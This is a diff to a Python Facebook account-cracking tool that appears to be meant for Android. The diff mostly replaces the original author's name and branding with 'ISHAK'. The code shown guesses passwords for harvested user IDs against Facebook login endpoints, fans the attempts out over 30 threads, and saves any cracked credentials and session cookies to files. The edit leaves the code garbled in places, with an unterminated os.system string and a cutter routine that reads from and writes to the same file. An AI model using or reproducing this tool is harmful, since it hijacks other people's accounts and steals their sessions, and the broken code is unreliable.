@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Muhmmad Sarfraz
+#Original written By Muhmmad ISHAK
 
 import os,zlib
 
@@ -30,7 +30,7 @@ except ModuleNotFoundError:
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
+from concurrent.futures import ThreadPoolExecutor as ISHAKISHAK
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -69,7 +69,7 @@ def randBuildvsskj():
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
-sys.stdout.write('\x1b]2; SSB\x07')
+sys.stdout.write('\x1b]2; ISHAK\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
@@ -77,17 +77,17 @@ F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 logo =                                          """            
-\033[1;37m    ######      ######     ########  
-\033[1;37m   ##    ##    ##    ##    ##     ## 
-\033[1;37m   ##          ##          ##     ## 
-\033[1;37m    ######      ######     ########  
-\033[1;37m         ##          ##    ##     ## 
-\033[1;37m   ##    ##    ##    ##    ##     ## 
-\033[1;37m    ######      ######     ########  
+\033[1;37m 
+\033[1;37m   
+\033[1;37m   
+\033[1;37m    
+\033[1;37m         
+\033[1;37m   
+\033[1;37m    
 \033[1;37m------------------------------------------------
-\033[1;37m Owner   :            Muhammad Sarfraz
-\033[1;37m Facebook:            Muhammad Sarfraz
-\033[1;37m Github  :            Sarfraz-Ssb
+\033[1;37m Owner   :            ISHAK-BRO
+\033[1;37m Facebook:            ISHAK
+\033[1;37m Github  :            ishak-ISHAK
 \033[1;37m Version :            19.8
 \033[1;37m------------------------------------------------ """
 def clear():
@@ -102,10 +102,10 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back ISHAK Menu ")
         exit()
 
-def sarfraz():   
+def ISHAK():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
@@ -140,14 +140,14 @@ def sarfraz():
     elif select =='9':
        cutter()
     elif select =='W':
-        os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7')
+        os.system('xdg-open open https://m.facebook.com/groups/822430109526151/')
         pass
     elif select =='F':
-        os.system('xdg-open https://facebook.com/groups/3017062245271082/')
+        os.system('xdg-open )
     else:
         print('\n Select valid option ... ')
         time.sleep(2)
-        SSB(allkey)
+        ISHAK(allkey)
         
 def method_crack():
     global methods
@@ -172,7 +172,7 @@ def method_crack():
     #    methods.append('methodD')
    #     main_crack().crack(id)
     elif option =='0':
-        sarfraz()
+        ISHAK()
     else:
       print('\n Select Valid Option ...')
       time.sleep(2)
@@ -200,7 +200,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[ishak] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -248,15 +248,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ISHAKb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ISHAKb};{ckkk}"
+                    print(f"\r{R} [ISHAK-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ISHAK_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ISHAK_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [ISHAK-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/ISHAK_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -266,7 +266,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[ISHAK] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -314,15 +314,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ISHAKb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ISHAKb};{ckkk}"
+                    print(f"\r{R} [ISHAK-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ISHAK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ISHAK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [ISHAK-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/ISHAK_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -332,7 +332,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[ISHAK] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -380,15 +380,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ISHAKb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ISHAKb};{ckkk}"
+                    print(f"\r{R} [ISHAK-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/ISHAK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ISHAK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [ISHAK-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/ISHAK_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -397,7 +397,7 @@ class main_crack():
 
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r {S}[SSB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r {S}[ISHAK] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -415,14 +415,14 @@ class main_crack():
                 session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [ISHAK-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/ISHAK_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [ISHAK-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/ISHAK_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -456,7 +456,7 @@ class main_crack():
             print(f'{S} Total IDs : %s ' % len(self.id))
             print(f'{S} Cracking Started...')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with ISHAKISHAK(max_workers=30) as ISHAKworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -466,13 +466,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                ssbworld.submit(self.methodA, uid, name, pwx)
+                                ISHAKworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                ssbworld.submit(self.methodB, uid, name, pwx)
+                                ISHAKworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                ssbworld.submit(self.methodC, uid, name, pwx)
+                                ISHAKworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                ssbworld.submit(self.methodD, uid, name, pwx)
+                                ISHAKworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
             
@@ -534,7 +534,7 @@ def public():
             except KeyError:
                 print(f"\n{S}ID Not Found ...");pass
                 menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/ISHAK.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -587,7 +587,7 @@ def follower():
         except KeyError:
             print(f"{A}ID Not Public");time.sleep(1)
             menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/ISHAK.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -629,7 +629,7 @@ def sids():
     print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
     limit = int(input('How many links do you want to separate?: '))
     clear()
-    print('\033[1;37mExample: /sdcard/SSB.txt\033[0;97m')
+    print('\033[1;37mExample: /sdcard/ISHAK.txt\033[0;97m')
     print(47*'-')
     new_save = input('Save new file as: ')
     clear()
@@ -652,18 +652,18 @@ def cutter():
     os.system('clear')
     print(logo)
     print("Enter File Path / File Location \n")
-    ssb = input('Put File Name :')
+    ISHAK = input('Put File Name :')
     print(" ")
-    sarfraz = input('Saving Put File Name :')
-    os.system('touch ' +sarfraz)
-    os.system('sort -r '+ssb+' | uniq > '+sarfraz)
+    ISHAK = input('Saving Put File Name :')
+    os.system('touch ' +ISHAK)
+    os.system('sort -r '+ISHAK+' | uniq > '+ISHAK)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File : " + ssb )
+    print("Removed Successful From File : " + ISHAK )
     print(47*'-')
-    print("File Saved To :" + sarfraz )
+    print("File Saved To :" + ISHAK )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back ISHAK Menu ")
     menu
        
 
@@ -802,7 +802,7 @@ def p_dump():
         
         srange = int(input('How many IDs do you want to add?: ' ))
         clear()
-        print(f'{S}File Name To Dump Ids. Example /sdcard/SSB.txt\n') 
+        print(f'{S}File Name To Dump Ids. Example /sdcard/ISHAK.txt\n') 
         filepath = input("Put File Name: ")
         apnd = open(filepath , 'a')
         clear()
@@ -825,30 +825,30 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back SSB Menu ")
-        SSB(allkey)
+        input("Press enter to back ISHAK Menu ")
+        ISHAK(allkey)
     except Exception as e:
         print("Error : %s"%e) 
         
 def cutter():
     clear()
     print("Enter File Path / File Location \n")
-    ssb = input('Put File Name:')
+    ISHAK = input('Put File Name:')
     print(" ")
-    sarfraz = input('Saving Put File Name:')
-    os.system('touch ' +sarfraz)
-    os.system('sort -r '+ssb+' | uniq > '+sarfraz)
+    ISHAK = input('Saving Put File Name:')
+    os.system('touch ' +ISHAK)
+    os.system('sort -r '+ISHAK+' | uniq > '+ISHAK)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File: " + ssb )
-    print("New File Saved:" + sarfraz )
+    print("Removed Successful From File: " + ISHAK )
+    print("New File Saved:" + ISHAK )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
-    SSB(allkey)       
+    input(f"{S} Press Enter To Back ISHAK Menu ")
+    ISHAK(allkey)       
     
 def removef():
         os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
-        SSB(allkey)            
+        ISHAK(allkey)            
  
 
-sarfraz()
+ISHAK()
